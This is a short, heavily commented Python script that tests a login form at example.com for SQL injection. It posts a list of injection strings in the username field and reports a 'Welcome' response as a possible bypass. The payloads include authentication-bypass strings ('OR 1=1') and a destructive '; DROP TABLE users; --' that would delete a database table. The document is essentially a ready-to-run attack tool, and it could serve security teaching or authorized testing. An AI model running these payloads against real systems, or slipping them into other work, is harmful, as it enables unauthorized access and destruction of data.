# Import the requests library for sending HTTP requests
import requests

# The URL of the vulnerable login form that is potentially vulnerable to SQL Injection
vulnerable_url = "http://example.com/login"

# List of SQL Injection payloads to be tested
payloads = [
    "' OR 1=1 --",           # This payload tries to make the SQL query always return true (bypassing authentication)
    "'; DROP TABLE users; --",# This payload attempts to drop the 'users' table (destructive SQL injection)
    "' OR 'a'='a"            # Similar to the first payload, it always returns true and may bypass authentication
]

# Loop through each payload in the list of payloads
for payload in payloads:
    # The data to be sent in the POST request, with the SQL injection payload in the 'username' field
    data = {'username': payload, 'password': 'password'}
    
    # Send a POST request to the vulnerable URL with the form data
    response = requests.post(vulnerable_url, data=data)
    
    # Check if the response contains "Welcome", indicating a successful login (and possibly successful SQL injection)
    if "Welcome" in response.text:
        # Print a message indicating a potential SQL Injection vulnerability with the specific payload
        print(f"[+] Possible SQL Injection with payload: {payload}")
    else:
        # Print a message indicating that the payload failed to bypass authentication
        print(f"[-] Payload failed: {payload}")